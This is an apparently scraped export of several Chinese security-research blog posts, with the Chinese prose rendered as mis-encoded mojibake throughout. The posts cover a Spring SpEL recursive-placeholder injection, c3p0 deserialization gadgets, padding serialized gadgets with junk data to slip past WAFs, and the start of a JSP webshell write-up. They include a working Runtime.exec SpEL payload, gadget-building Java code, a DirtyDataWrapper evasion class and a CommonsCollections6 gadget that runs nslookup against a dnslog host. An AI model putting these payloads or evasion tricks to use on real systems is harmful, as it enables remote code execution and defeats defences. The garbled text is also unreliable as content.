åœ¨äºè¿™é‡Œä½¿ç”¨äº†é€’å½’ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœå‚æ•°åä¸­è¿˜åŒ…å«${å’Œ}çš„è¯ï¼Œè¿™ä¸ªè§£æå¼•æ“ä¼šå†æ¬¡é€’å½’ä¸€æ¬¡ï¼Œå†æ¬¡è§£æè¿™ä¸ªå€¼ï¼Œå¦‚ï¼Œæ¨¡æ¿ä¸­æœ‰ä¸ªå€¼ä¸º${${abc}}ï¼Œç”±äºä½¿ç”¨äº†é€’å½’ï¼Œè§£æå¼•æ“ä¼šå¯¹å…¶è§£æä¸¤æ¬¡ï¼Œç¬¬ä¸€å±‚å»æ‰æœ€å¤–å±‚çš„{}è§£ææˆ${abc}ï¼Œç„¶åå°†å…¶ä½œä¸ºå‚æ•°è¿›è¡Œç¬¬äºŒæ¬¡è§£æã€‚åœ¨ç¬¬äºŒæ¬¡è§£æä¸­å°†é‡Œå±‚çš„{}å»æ‰ï¼Œå˜æˆabc åˆ†æç®€ç®€å•å•å†™ä¸ªæŠ›å‡ºå¼‚å¸¸çš„æ§åˆ¶å™¨å³å¯ï¼Œè¿™é‡Œè®¿é—®ä¸‹é¢è¿™ä¸ªurlï¼Œé¡µé¢å½“ä¸­å°±ä¼šå‡ºç°36 1http://127.0.0.1:8080/?test=$&#123;6*6&#125; 12345678public String abc(HttpServletRequest request)&#123; try &#123; throw new NullPointerException(request.getParameter(&quot;cmd&quot;)); &#125;catch (Exception e)&#123; &#125; è¿›å…¥æ­£é¢˜ï¼Œåœ¨org.springframework.util.PropertyPlaceholderHelper#parseStringValue é¦–å…ˆä¼šæå–å‡º$&#123;&#125;å½“ä¸­çš„å†…å®¹ï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªæ˜¯ä»æ¨¡æ¿é‡Œå–å‡ºçš„æ‰€ä»¥åªèƒ½æ˜¯timestamp\\error\\status\\message ä»¥timestampä¸ºä¾‹å­ï¼Œè¿™é‡Œåœ¨å¾—åˆ°SpELè§£æçš„ç»“æœåä¸‹é¢è¿˜ä¼šå†å¯¹è¿™ä¸ªå€¼ç»§ç»­è¿›è¡ŒSpELè¡¨è¾¾å¼è§£æï¼Œå¾ˆéªšï¼Œè°ƒç”¨çš„æ˜¯parseStringValueï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹å› æ­¤é€ æˆäº†SpELçš„é€’å½’è§£æå› æ­¤æœ€ç»ˆå¯¼è‡´æ¼æ´çš„äº§ç”Ÿï¼ŒçŸ¥é“è¿™ä¸ªè¿‡ç¨‹ä»¥åæˆ‘ä»¬ç”šè‡³å¯ä»¥è®©payloadå˜å¾—æ›´éš¾è¢«æ¢æµ‹ï¼Œæ¯”å¦‚$&#123;$&#123;1*2&#125;*6&#125;ä¼šè¿”å›12 ç”±å­—ç¬¦ä¸²æ ¼å¼è½¬æ¢æˆ 0x** java å­—èŠ‚å½¢å¼ï¼Œæ–¹ä¾¿æ‰§è¡Œä»»æ„ä»£ç ï¼š 1234567# coding: utf-8result = &quot;&quot;target = &#x27;open -a Calculator&#x27;for x in target: result += hex(ord(x)) + &quot;,&quot;print(result.rstrip(&#x27;,&#x27;)) è¿™é‡Œæ‰§è¡Œopen -na Calculator 1$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125; è¡¥ä¸åˆ†æè¡¥ä¸åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„NonRecursivePropertyPlaceholderHelperç±»ï¼Œç”¨äºé˜²æ­¢parseStringValueè¿›è¡Œé€’å½’è§£æ å‚è€ƒæ–‡ç« https://www.jianshu.com/p/ce4ac733a4b9","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SpEL","slug":"SpEL","permalink":"https://y4tacker.github.io/tags/SpEL/"}]},{"title":"c3p0çš„ä¸‰ä¸ªgadgetçš„å­¦ä¹ ","slug":"year/2022/2/c3p0çš„ä¸‰ä¸ªgadgetçš„å­¦ä¹ ","date":"2022-02-06T09:43:23.000Z","updated":"2024-08-04T09:01:49.161Z","comments":true,"path":"2022/02/06/year/2022/2/c3p0çš„ä¸‰ä¸ªgadgetçš„å­¦ä¹ /","link":"","permalink":"https://y4tacker.github.io/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"c3p0çš„ä¸‰ä¸ªgadgetçš„å­¦ä¹ ç›®å‰c3p0æœ‰ä¸‰ç§æ–¹å¼getshell åŠ è½½è¿œç¨‹ç±» jndi hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨ å‰ä¸¤ä¸ªå¯ä»¥æ”¾åœ¨ä¸€èµ·å­¦ä¹ ,åœ¨com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ˜¯IndirectlySerializedçš„å®ä¾‹å°±ä¼šå»è°ƒç”¨getObjectæ–¹æ³• 123if (o instanceof IndirectlySerialized) &#123; o = ((IndirectlySerialized)o).getObject();&#125; è€Œå®ƒçš„å®ç°ç±»åªæœ‰ä¸€ä¸ªcom.mchange.v2.naming.ReferenceIndirector.ReferenceSerializedï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ è§¦å‘jndiå¾ˆæ˜æ˜¾å¦‚æœcontextNameä¸ä¸ºç©ºï¼Œåˆ™ä¼šè§¦å‘ï¼Œè¿™é‡Œæ²¡å¿…è¦ç»§ç»­è¯´ä¸‹å»äº† åŠ è½½è¿œç¨‹ç±»æ¥ä¸‹æ¥æ˜¯ç¬¬äºŒä¸ªï¼Œè¿™ä¹Ÿæ˜¯ysoserialæœ¬èº«é›†æˆçš„ä¸€ä¸ªpayloadï¼Œç»§ç»­å¾€ä¸‹çœ‹ï¼ŒReferenceableUtils.referenceToObjectï¼Œä¹Ÿæ˜¯å¾ˆæ˜æ˜¾é€šè¿‡URLClassloaderåŠ è½½è¿œç¨‹ç±»ï¼Œå¹¶ä¸”é»˜è®¤åˆå§‹åŒ–äº†ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åœ¨é™æ€å—é‡Œé¢æ”¾å…¥æ¶æ„æ•°æ® å…³äºwriteObjectçš„è¯ï¼Œä»¥ysoserialçš„ä¸ºä¾‹ï¼ŒPoolSource implements ConnectionPoolDataSource, Referenceableï¼Œåªè¦ä¸å®ç°åºåˆ—åŒ–æ¥å£ï¼Œå¹¶å®ç°getReferenceæ–¹æ³•è¿”å›æˆ‘ä»¬çš„Referenceå¯¹è±¡å³å¯ï¼Œä¹Ÿæ˜¯å¾ˆç®€å•çš„ hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿™ä¸ªæ›´å¤šä¼šç”¨åˆ°åœ¨fastjsonï¼ŒSnake YAML , JYAML,Yamlbeans , Jackson,Blazeds,Red5, Castorç­‰é‡Œé¢é…åˆä½¿ç”¨ å½“åœ¨userOverridesAsStringå½“ä¸­è®¾ç½®äº†åºåˆ—åŒ–æ•°æ®åï¼Œå½“è°ƒç”¨setæ–¹æ³•setUpPropertyListenersæ—¶å°±èƒ½è§¦å‘ï¼Œè€Œè¿™ä¸ªç›‘å¬å™¨æ­£å¥½åœ¨è®¾ç½®å®ŒuserOverridesAsStringå°±ä¼šè°ƒç”¨ å¯ä»¥çœ‹åˆ°é‡Œé¢å¯¹åºåˆ—åŒ–æ•°æ®çš„å¤„ç† 123456789public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException &#123; if (userOverridesAsString != null) &#123; String hexAscii = userOverridesAsString.substring(&quot;HexAsciiSerializedMap&quot;.length() + 1, userOverridesAsString.length() - 1); byte[] serBytes = ByteUtils.fromHexAscii(hexAscii); return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes)); &#125; else &#123; return Collections.EMPTY_MAP; &#125;&#125; æœ€åè§¦å‘åŸç”Ÿååºåˆ—åŒ– åé¢æ‰å‘ç°åˆä¸ªåœ°æ–¹æ¯”è¾ƒå‘ï¼Œåœ¨com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString 1String hexAscii = userOverridesAsString.substring(&quot;HexAsciiSerializedMap&quot;.length() + 1, userOverridesAsString.length() - 1); è¿™é‡Œä¼šæŠŠæœ€åä¸€ä½åƒäº†æœ‰ç‚¹æ¶å¿ƒï¼Œå› æ­¤æ„é€ payloadçš„æ—¶å€™è¦åƒè¿™æ · 1String payload = &quot;HexAsciiSerializedMap:&quot;+HexString+&quot;:&quot;; è¿™é‡Œç»™ä¸ªdemoæ–¹ä¾¿æµ‹è¯• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import com.govuln.deserialization.CB1;import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;import hudson.remoting.Base64;import javassist.ClassPool;import javassist.CtClass;import org.python.antlr.ast.Str;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.lang.reflect.Modifier;import java.util.HashSet;import java.util.LinkedList;import java.util.PriorityQueue;public class Test &#123; public static byte[] toByteArray(InputStream in) throws IOException &#123; byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; &#125; public static String bytesToHexString(byte[] bArray, int length) &#123; StringBuffer sb = new StringBuffer(length); for(int i = 0; i &lt; length; ++i) &#123; String sTemp = Integer.toHexString(255 &amp; bArray[i]); if (sTemp.length() &lt; 2) &#123; sb.append(0); &#125; sb.append(sTemp.toUpperCase()); &#125; return sb.toString(); &#125; public static void main(String[] args) throws Exception &#123; byte[] data = CB1.getPayload(); String HexString = bytesToHexString(data, data.length); System.out.println(HexString.length()); String payload = &quot;HexAsciiSerializedMap:&quot;+HexString+&quot;:&quot;; WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = new WrapperConnectionPoolDataSource(); wrapperConnectionPoolDataSource.setUserOverridesAsString(payload); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"C3P0","slug":"C3P0","permalink":"https://y4tacker.github.io/tags/C3P0/"}]},{"title":"å¯¹Javaååºåˆ—åŒ–æ•°æ®ç»•WAFæ–°å§¿åŠ¿çš„è¡¥å……","slug":"year/2022/2/å¯¹Javaååºåˆ—åŒ–æ•°æ®ç»•WAFæ–°å§¿åŠ¿çš„è¡¥å……","date":"2022-02-05T08:26:28.000Z","updated":"2024-08-04T09:01:49.176Z","comments":true,"path":"2022/02/05/year/2022/2/å¯¹Javaååºåˆ—åŒ–æ•°æ®ç»•WAFæ–°å§¿åŠ¿çš„è¡¥å……/","link":"","permalink":"https://y4tacker.github.io/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/","excerpt":"","text":"å¯¹Javaååºåˆ—åŒ–è„æ•°æ®ç»•WAFæ–°å§¿åŠ¿çš„è¡¥å……å¼•è¨€ç›¸ä¿¡å¤§å®¶éƒ½çœ‹è¿‡å›å¿†é£˜å¦‚é›ªå¤§å¸ˆå‚…çš„ä¸€ç¯‡æ–‡ç« ï¼ŒJavaååºåˆ—åŒ–æ•°æ®ç»•WAFä¹‹åŠ å¤§é‡è„æ•°æ®ï¼Œåœ¨è¿™ç¯‡æ–‡ç« å½“ä¸­å¤§å¸ˆå‚…æå‡ºäº†é€šè¿‡å°†gadgetåŠ å…¥åˆ°é›†åˆç±»å‹ä»è€Œå¯ä»¥å®ç°æ·»åŠ è„æ•°æ®ï¼Œè¿™é‡Œæˆ‘å‘ç°äº†ä¸€ä¸ªæ–°å§¿åŠ¿ çµæ„Ÿä¹Ÿæ˜¯æ¥æºäºå›å¿†é£˜å¦‚é›ªå¤§å¸ˆå‚…çš„å¦ä¸€ç¯‡æ–‡ç« çš„ä¸€ä¸ªä¸€ç¬”å¸¦è¿‡çš„é—®é¢˜ä¸Š è¿™åŸæœ¬æ˜¯å¤§å¸ˆå‚…æƒ³æ¥ægadgetæ¢æµ‹çš„æ–¹æ¡ˆï¼Œä½†æ˜¯å´å¤±è´¥äº†ï¼Œä½†æœ¬ç€ä¸“ç ”çš„å·¥åŒ ç²¾ç¥ï¼Œæˆ‘å¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†æ·±å…¥çš„ç ”ç©¶ï¼Œè¿™é‡Œé¡ºä¾¿å¯¹è¿™ä¸ªé—®é¢˜è§£è¯» ä¸ºä»€ä¹ˆè¿™é‡Œç¬¬ä¸€ä¸ªå±æ€§ååºåˆ—åŒ–å¤±è´¥ï¼Œä»ç„¶è§¦å‘äº†URLDNSçš„æ•´ä¸ªè¿‡ç¨‹é¡ºä¾¿è¿™é‡Œå¤šæä¸€å˜´ï¼Œä¸ºä»€ä¹ˆä¹‹åå¤§å¸ˆå‚…æå‡ºçš„ç›´æ¥å°†URLDNSä¸­çš„HashMapçš„é”®å€¼å¯¹ä¸­å°†keyæˆ–è€…valueä»»æ„æ›¿æ¢ä¸€ä¸ªä¸ºéœ€è¦æ¢æµ‹çš„classå°±å¯ä»¥å‘¢ï¼Œå…¶å®æ ¸å¿ƒåŸå› åœ¨äºæ˜¯å¦èƒ½è§¦å‘ä¹‹åçš„hash()å‡½æ•°ï¼ è¿™é‡Œæˆ‘ä»¬è°ƒé‡ç‚¹æ¥è®²ï¼Œå¥½äº†æˆ‘ä»¬æ¥çœ‹çœ‹å½“äº§ç”ŸClassNotFoundExceptionåï¼Œæœ€ç»ˆåœ¨java.io.ObjectInputStream#readSerialData,åœ¨æŠ›å‡ºå¼‚å¸¸ä¹‹åä»–ä¼šå»ç»§ç»­è°ƒç”¨skipCustomData è¿™é‡Œæœ‰ä¸ªifåˆ¤æ–­ï¼Œå¤§æ¦‚æ˜¯åˆ¤æ–­å½“å‰æ˜¯å¦è¿˜åœ¨å—æ•°æ®å½“ä¸­ï¼Œå¦‚æœæ˜¯è·³åˆ°ä¸‹ä¸€ä¸ªå—æ•°æ®å½“ä¸­ï¼Œæ¯ä¸ªå—åˆ†éš”æ˜¯é€šè¿‡0x78è¿™ä¸ªå­—èŠ‚ï¼Œå› ä¸ºè¿™ä¸ªå­—èŠ‚æ˜¯ä¸€ä¸ªå—çš„ç»“å°¾ æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªswitchå¾ªç¯ï¼Œé€šè¿‡ä¸‹ä¸€å­—èŠ‚æ¥åˆ¤æ–­ï¼Œè¿™é‡Œå¦‚æœéƒ½ä¸æ˜¯åˆ™ä¼šç›´æ¥å¯¹ä¸‹ä¸€æ®µè¿›è¡Œååºåˆ—åŒ–ï¼ï¼ï¼å¾ˆç¥å¥‡å§ å› æ­¤ç°åœ¨æˆ‘ä»¬å°±èƒ½è§£é‡Šä¸ºä»€ä¹ˆå½“åˆå¯¹äºï¼Œè¿™ä¸€æ®µä»£ç æˆ‘ä»¬èƒ½å¤ŸæˆåŠŸè§¦å‘URLDNSçš„ååºåˆ—åŒ–è¿‡ç¨‹å‘¢ï¼Œæ²¡é”™å°±æ˜¯ä¸Šé¢è¿™å¼ å›¾ï¼Œä»–ç›´æ¥å¯¹ä¸‹ä¸€ä¸ªå—æ•°æ®ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–å› æ­¤å¯¹HashMapçš„ååºåˆ—åŒ–æœ€ç»ˆå¯¼è‡´URLDNSå®Œæ•´è§¦å‘ 123List&lt;Object&gt; a = new LinkedList&lt;Object&gt;();a.add(makeClass(&quot;TargetClass&quot;));a.add(new URLDNS.getObject(&quot;http://test.dnslog.cn&quot;)); é‚£ä¹ˆä¸ºä»€ä¹ˆè¿™æ ·å´èƒ½å®ç°éœ€æ±‚å‘¢ 123HashMap ht = new HashMap();URL u = new URL(null, url, handler); ht.put(u,æˆ‘æ˜¯è¦æ¢æµ‹çš„gadget); åœ¨è¿™é‡Œå½“è°ƒç”¨äº†K key = (K) s.readObject();ç”±äºç±»ä¸å­˜åœ¨æŠ›å‡ºå¼‚å¸¸ï¼Œä¹‹åç»§ç»­å¯¹ä¸‹ä¸€å—æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€ç»ˆæŠ›å‡ºå¼‚å¸¸åä¹Ÿä¸å¯èƒ½ç»§ç»­è°ƒç”¨ä¸‹é¢çš„value = s.readObjet()äº†ï¼Œæ›´åˆ«è°ˆé€šè¿‡hashå‡½æ•°æœ€ç»ˆè§¦å‘URLDNSï¼Œå› æ­¤æœ€ç»ˆèƒ½å¤ŸæˆåŠŸ çµæ„Ÿå¤§å‘æ—¢ç„¶åœ¨æŠ›å‡ºClassNotFoundExceptionåä»–è¿˜ä¼šå»ç»§ç»­ååºåˆ—åŒ–ä¸‹ä¸€å—æ•°æ®ï¼Œå¹¶ä¸”è¿™æ˜¯ä¸ªç›¸å½“äºwhile Trueçš„ä¸œè¥¿ğŸ¤ªï¼ï¼ é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±å¯ä»¥è¿™æ ·ç–¯ç‹‚å¥—å¨ƒå®ç°åƒåœ¾æ•°æ®å‘¢ï¼Ÿè¯´å¹²å°±å¹²ï¼Œå½“ç„¶å¤§å®¶åˆ«å¿˜äº†å¼•å…¥javassistçš„ä¾èµ– ç®€ç®€å•å•å¯¹CommonsBeanutils1æ¥å‘æµ‹è¯• 12345678910111213141516171819202122232425public class Test &#123; public static Class makeClass(String clazzName) throws Exception&#123; ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(clazzName); Class clazz = ctClass.toClass(); ctClass.defrost(); return clazz; &#125; public static void main(String[] args) throws Exception&#123; PriorityQueue priorityQueue = CB1.getObject(); LinkedList linkedList = new LinkedList(); StringBuilder sb = new StringBuilder(); for(int i=0;i&lt;100;i++)&#123; sb.append(&quot;e&quot;); linkedList.add(makeClass(&quot;woshijiad&quot;+sb)); &#125; linkedList.add(priorityQueue); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(linkedList); oos.close(); System.out.println(Base64.encode(barr.toByteArray())); &#125;&#125; å½“ç„¶è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å‘å°±æ˜¯ å¤§å®¶ä¸è¦ç›´æ¥åƒè¿™æ ·ï¼Œä¹‹å‰makeClassæ˜¯è¿”å›çš„Classé»˜è®¤æ˜¯ç»§æ‰¿åºåˆ—åŒ–å€Ÿå£çš„ï¼Œè¿™æ ·å°±å¯¼è‡´è™½ç„¶ä¹Ÿèƒ½å¼¹å‡ºè®¡ç®—å™¨ï¼Œä½†åªæ˜¯å› ä¸ºlinkedListå¯¹é‡Œé¢çš„å…ƒç´ å¾ªç¯éå†æ‰§è¡ŒreadObjectçš„ç»“æœï¼Œè€Œä¸æ˜¯æœ¬ç¯‡æå‡ºçš„é€šè¿‡åœ¨ClassNotFoundExceptionåˆ©ç”¨skipCustomDataåè¯»å–ä¸‹ä¸€å—æ•°æ®æ‰§è¡Œååºåˆ—åŒ–åˆ©ç”¨çš„è¿‡ç¨‹ 123456789101112131415PriorityQueue priorityQueue = CB1.getObject();LinkedList linkedList = new LinkedList();StringBuilder sb = new StringBuilder();for(int i=0;i&lt;100;i++)&#123;sb.append(&quot;e&quot;);linkedList.add(makeClass(&quot;woshijiad&quot;+sb));&#125;linkedList.add(priorityQueue);ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(barr);oos.writeObject(linkedList);oos.close();//ä¸è¦åŒæ—¶è¿è¡ŒObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));ois.readObject();","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"Javaååºåˆ—åŒ–è„æ•°æ®ç»•WAF","slug":"year/2022/2/Javaååºåˆ—åŒ–è„æ•°æ®ç»•WAF","date":"2022-02-05T01:46:10.000Z","updated":"2024-08-04T09:01:49.093Z","comments":true,"path":"2022/02/05/year/2022/2/Javaååºåˆ—åŒ–è„æ•°æ®ç»•WAF/","link":"","permalink":"https://y4tacker.github.io/2022/02/05/year/2022/2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95WAF/","excerpt":"","text":"Javaååºåˆ—åŒ–è„æ•°æ®ç»•WAFå¹³æ—¶æˆ‘ä»¬é‡åˆ°ç«™ç‚¹çš„æ—¶å€™å¶å°”èƒ½çœ‹åˆ°é€šè¿‡å¤§é‡è„æ•°æ®ç»•è¿‡wafï¼Œå½“ç„¶åœ¨javaååºåˆ—åŒ–ä¹Ÿå¯ä»¥ï¼Œå®ç°æ€è·¯æ˜¯éœ€è¦æ‰¾åˆ°ä¸€ä¸ªclasså¯ä»¥åºåˆ—åŒ–ï¼Œå®ƒå¯ä»¥æŠŠè„æ•°æ®å¯¹è±¡å’Œgadgetä¸€èµ·åŒ…è£¹èµ·æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾çš„classï¼Œç¬¬ä¸€éœ€è¦å®ç°java.io.Serializableæ¥å£ï¼Œç¬¬äºŒå¯ä»¥å­˜å‚¨ä»»æ„å¯¹è±¡ï¼Œæˆ‘çš„ç¬¬ä¸€æƒ³æ³•æ˜¯HashMapå› ä¸ºä¹‹å‰ä¹Ÿè€ƒè™‘è¿‡ï¼Œæ¯•ç«ŸHashMapåœ¨å–å‡ºkeyå’Œvalueçš„æ—¶å€™ï¼Œéƒ½ä¼šå¯¹å¯¹è±¡è¿›è¡Œååºåˆ—åŒ– å¦‚ä¸‹ï¼š 1234567HashMap&lt;String, Object&gt; stringObjectHashMap = new HashMap&lt;String, Object&gt;();StringBuilder sb=new StringBuilder(); for(int i=0; i &lt; 10000; i++) &#123; sb.append(&quot;a&quot;); &#125;stringObjectHashMap.put(String.valueOf(sb),queue);ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(barr);oos.writeObject(stringObjectHashMap);oos.close(); å½“ç„¶åé¢çœ‹åˆ°äº†åˆ«äººçš„æ–‡ç« ï¼Œæ‰å‘ç°è‡ªå·±è¿˜æ˜¯è€ƒè™‘çš„æ¯”è¾ƒå°‘ï¼Œå…¶å®é›†åˆç±»å‹å°±å¾ˆå®¹æ˜“ç¬¦åˆ 123456ArrayListLinkedListHashMapLinkedHashMapTreeMapâ€¦â€¦ å¹¶ä¸”æœ€é‡è¦çš„æ˜¯è¿˜èƒ½ä¸æ–­å¥—å¨ƒï¼Œè¿™é‡Œç›´æ¥æ¬è¿ç½‘ä¸Šä»£ç å†™çš„å¾ˆå¥½äº† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677public class DirtyDataWrapper &#123; private int dirtyDataSize; //è„æ•°æ®å¤§å° private String dirtyData; //è„æ•°æ®å†…å®¹ private Object gadget; // ysoserila gadgetå¯¹è±¡ public DirtyDataWrapper(Object gadget, int dirtyDataSize)&#123; this.gadget = gadget; this.dirtyDataSize = dirtyDataSize; &#125; /** * å°†è„æ•°æ®å’Œgadgetå¯¹è±¡å­˜åˆ°é›†åˆå¯¹è±¡ä¸­ * @return ä¸€ä¸ªåŒ…è£¹è„æ•°æ®å’Œgadgetå¯¹è±¡å¯åºåˆ—åŒ–å¯¹è±¡ */ public Object doWrap()&#123; Object wrapper = null; dirtyData = getLongString(dirtyDataSize); int type = (int)(Math.random() * 10) % 10 + 1; switch (type)&#123; case 0: List&lt;Object&gt; arrayList = new ArrayList&lt;Object&gt;(); arrayList.add(dirtyData); arrayList.add(gadget); wrapper = arrayList; break; case 1: List&lt;Object&gt; linkedList = new LinkedList&lt;Object&gt;(); linkedList.add(dirtyData); linkedList.add(gadget); wrapper = linkedList; break; case 2: HashMap&lt;String,Object&gt; map = new HashMap&lt;String, Object&gt;(); map.put(&quot;a&quot;,dirtyData); map.put(&quot;b&quot;,gadget); wrapper = map; break; case 3: LinkedHashMap&lt;String,Object&gt; linkedHashMap = new LinkedHashMap&lt;String,Object&gt;(); linkedHashMap.put(&quot;a&quot;,dirtyData); linkedHashMap.put(&quot;b&quot;,gadget); wrapper = linkedHashMap; break; default: case 4: TreeMap&lt;String,Object&gt; treeMap = new TreeMap&lt;String, Object&gt;(); treeMap.put(&quot;a&quot;,dirtyData); treeMap.put(&quot;b&quot;,gadget); wrapper = treeMap; break; &#125; return wrapper; &#125; /** * ç”Ÿäº§éšæœºå­—ç¬¦ä¸² * @param length éšæœºå­—ç¬¦ä¸²é•¿åº¦ * @return éšæœºå­—ç¬¦ä¸² */ public static String getLongString(int length)&#123; String str = &quot;&quot;; for (int i=0;i&lt;length;i++)&#123; str += &quot;x&quot;; &#125; return str; &#125; // æµ‹è¯• public static void main(String[] args) throws Exception&#123; Object cc6 = new CommonsCollections6().getObject(&quot;raw_cmd:nslookup xxx.dnslog.cn&quot;); DirtyDataWrapper dirtyDataFactory = new DirtyDataWrapper(cc6,100); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;/tmp/cc6.ser&quot;)); objectOutputStream.writeObject(dirtyDataFactory.doWrap()); objectOutputStream.flush(); objectOutputStream.close(); &#125;&#125; å½“ç„¶å…¶å®ä¸æ˜¯æ‰€æœ‰çš„é›†åˆç±»éƒ½é€‚åˆç”¨äºåŒ…è£¹è„æ•°æ®å’Œgadgetï¼Œæ¯”å¦‚LinkedHashSet,HashSetï¼ŒTreeSetç­‰ç±»å°±ä¸é€‚åˆï¼Œè‡³äºæ˜¯ä¸ºä»€ä¹ˆå‘¢å…¶å®é“ç†å¾ˆç®€å•ï¼Œè¿™äº›æ•°æ®ç»“æ„éƒ½æ˜¯æœ‰åºçš„ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœåˆšå¥½gadgetè¢«æ’åˆ—åœ¨å‰é¢ï¼Œå¯èƒ½å¯¹äºwafæ¥è¯´å°±å¯èƒ½å› æ­¤æ£€æµ‹åˆ°æˆ‘ä»¬çš„ä¸€äº›æ¶æ„æ•°æ®äº† å‚è€ƒæ–‡ç« Javaååºåˆ—åŒ–æ•°æ®ç»•WAFä¹‹åŠ å¤§é‡è„æ•°æ® | å›å¿†é£˜å¦‚é›ª (gv7.me)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"jspæ–°webshellçš„æ¢ç´¢ä¹‹æ—…","slug":"year/2022/2/jspæ–°webshellçš„æ¢ç´¢ä¹‹æ—…","date":"2022-02-03T09:53:08.000Z","updated":"2024-08-04T09:01:49.165Z","comments":true,"path":"2022/02/03/year/2022/2/jspæ–°webshellçš„æ¢ç´¢ä¹‹æ—…/","link":"","permalink":"https://y4tacker.github.io/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/","excerpt":"","text":"jspæ–°webshellçš„æ¢ç´¢ä¹‹æ—…ç®€ä»‹è¿™ç¯‡æ–‡ç« è®°å½•äº†æˆ‘ä»ä¸€ä¸ªå°å‘ç°åˆ°å®ç°RCEï¼Œä¸ºäº†å®ç°æ›´çŸ­çš„webshellï¼Œåœ¨è¿™ä¹‹é—´é‡åˆ°äº†ä¸€äº›çš„æ–°é—®é¢˜åˆ°è§£å†³ï¼Œå†åˆ°æœ€ç»ˆç²¾ç®€å¾—åˆ°ä¸€ä¸ªæ–°çš„jspäº”è¡ŒPayloadæ„æˆçš„webshellçš„è¿‡ç¨‹ å‘ç°åœ¨tomcatçš„æ‰«æä¸­éƒ½æœ‰å¯¹ä¸€äº›é…ç½®æ–‡ä»¶çš„æ‰«æä»¥åŠå¯¹é‡Œé¢çš„å±æ€§è§£æèµ‹å€¼çš„è¿‡ç¨‹ï¼Œç”±äºä¹‹å‰çš„ä¸€äº›å°å‘ç°(è¿™é‡Œä¸å¤šè¯´)ï¼Œä»Šå¤©ä¸‹åˆä¸€ä¸ªçªå¦‚å…¶æ¥çš„crushåœ¨æˆ‘å¿ƒä¸­å‡ºç°ï¼Œæˆ‘å»è·Ÿè¸ªäº†ä¸€ä¸‹è§£æcontext.xmlçš„è¿‡ç¨‹ åœ¨org.apache.catalina.startup.ContextConfig#contextConfigä¸­ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹åˆ°defaultContextXmlè¦ä¹ˆä»æ ‡å‡†ä¸Šä¸‹æ–‡ï¼Œè¦ä¹ˆåˆ™æ˜¯é»˜è®¤å€¼conf/context.xml 